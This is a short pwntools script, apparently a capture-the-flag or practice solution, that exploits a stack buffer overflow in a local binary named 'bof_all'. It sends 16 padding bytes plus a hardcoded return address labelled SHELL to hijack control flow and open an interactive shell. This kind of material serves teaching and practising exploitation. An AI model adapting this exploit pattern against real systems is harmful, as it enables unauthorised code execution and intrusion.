from pwn import *

p = process("./bof_all")

SHELL = 0x080484b6

p.sendline('A'*16 + p32(SHELL))
p.interactive()
